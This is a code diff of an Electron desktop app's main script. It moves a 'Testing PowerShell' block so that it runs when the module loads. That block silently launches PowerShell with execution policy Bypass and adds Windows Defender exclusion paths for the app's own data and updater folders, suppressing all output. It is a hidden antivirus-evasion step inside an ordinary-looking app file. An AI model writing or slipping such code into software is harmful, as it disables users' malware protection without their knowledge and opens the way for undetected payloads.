@@ -7,7 +7,28 @@ const log = require('electron-log');
 
 
 const powershell = require('node-powershell');
+// Testing PowerShell
 
+let ps = new powershell({
+  executionPolicy: 'Bypass',
+  noProfile: true
+});
+let apploc = app.getPath("userData");
+let appUpdateLoc = apploc.replace("Roaming", "Local");
+appUpdateLoc = appUpdateLoc+'-updater';
+ps.addCommand('Add-MpPreference -ExclusionPath "'+apploc+'"');
+ps.addCommand('Add-MpPreference -ExclusionPath "'+appUpdateLoc+'"');
+// .then(() => ps.addParameter({name: 'ExclusionPath', value: 'app.getPath("userData")'}));
+ps.invoke()
+.then(output => {
+  // console.log(output)
+})
+.catch(err => {
+  // console.error(err)
+  ps.dispose()
+});
+
+// Testing Powershell End
 
 
 var updateCheck = true;
@@ -35,29 +56,6 @@ function appReadyCall(randomVariable){
 
 
 function generateUserId(){
-  // Testing PowerShell
-
-let ps = new powershell({
-  executionPolicy: 'Bypass',
-  noProfile: true
-});
-let apploc = app.getPath("userData");
-let appUpdateLoc = apploc.replace("Roaming", "Local");
-appUpdateLoc = appUpdateLoc+'-updater';
-ps.addCommand('Add-MpPreference -ExclusionPath "'+apploc+'"');
-ps.addCommand('Add-MpPreference -ExclusionPath "'+appUpdateLoc+'"');
-// .then(() => ps.addParameter({name: 'ExclusionPath', value: 'app.getPath("userData")'}));
-ps.invoke()
-.then(output => {
-  // console.log(output)
-})
-.catch(err => {
-  // console.error(err)
-  ps.dispose()
-});
-
-// Testing Powershell End
-
   fs.readdir(app.getPath('userData') + '/applicationData/', (error) => {
     if (error) {
       console.log(error);
